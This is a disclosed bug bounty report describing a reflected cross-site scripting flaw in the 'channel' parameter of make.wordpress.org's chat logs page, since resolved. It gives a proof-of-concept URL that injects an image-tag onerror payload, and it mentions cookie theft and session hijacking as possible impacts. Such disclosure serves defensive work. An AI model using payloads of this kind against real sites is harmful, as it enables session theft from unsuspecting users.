---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '659419'
original_report_id: '659419'
title: Reflected XSS on https://make.wordpress.org via 'channel' parameter
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: wordpress
created_at: '2019-07-25T10:56:27.823Z'
disclosed_at: '2019-08-26T00:45:03.993Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 95
asset_identifier: '*.wordpress.org'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on https://make.wordpress.org via 'channel' parameter

## Metadata

- HackerOne Report ID: 659419
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: wordpress
- Disclosed At: 2019-08-26T00:45:03.993Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi there,
I just found a reflected XSS on make.wordpress.org domain.

steps to reproduce : 
1. visit this link :
https://make.wordpress.org/chat/logs?channel=16%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&date=2019-07-21&no_bots=1
2. xss pop up will occurs

POC:
see:wp reflected xss.png

Note: it works on the latest version of firefox

## Impact

some of xss impact like stealing cookies, session hijacking, etc ..

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
